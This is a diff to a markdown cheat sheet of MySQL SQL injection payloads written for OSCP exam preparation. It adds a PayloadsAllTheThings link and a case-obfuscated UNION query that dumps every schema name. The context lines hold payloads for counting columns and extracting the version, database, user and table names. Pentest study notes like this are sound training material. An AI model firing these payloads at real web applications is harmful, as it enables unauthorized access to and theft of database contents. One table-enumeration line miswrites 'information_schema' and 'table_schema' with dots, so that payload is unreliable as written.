@@ -2,6 +2,7 @@
 
 #### Refs
 https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/sql-injection/mysql-injection/README.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
 
 #### Main
 SQL Injection is a very common attack vector in the `OSCP` exam. You will most likely see atleast one box where it is the intended attack path. I would recommend to anyone that is unfamiliar with `SQL` to learn the language on a basic level first, and then understanding `SQLI` is way easier. With that being said the first thing you want to do is stuff the input fields with common `SQLI` cmds:
@@ -51,7 +52,7 @@ After stuffing the input fields you should either obtain access to the system as
 #### MySQL
 
 ```txt
-### Keep in mind, depending on if you are using Union Based Or Regular SQL Injection, you need to change the commands from UNION ALL SELECT 1,2,<CMD> to SELECT <CMD>
+## Keep in mind, depending on if you are using Union Based Or Regular SQL Injection, you need to change the commands from UNION ALL SELECT 1,2,<CMD> to SELECT <CMD>
 
 # Get number of columns
 ' ORDER BY 3--
@@ -60,6 +61,9 @@ After stuffing the input fields you should either obtain access to the system as
 ' UNION SELECT 1, VERSION(), 3--
 ' UNION SELECT 1,2, DATABASE()--
 ' UNION SELECT 1,2, USER()--
+
+# Get all DBs on server
+' UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
 
 # Get table name
 ' UNION ALL SELECT 1,2, GROUP_CONCAT(table_name) FROM information.schema.tables WHERE table.schema="<DATABASE>"--
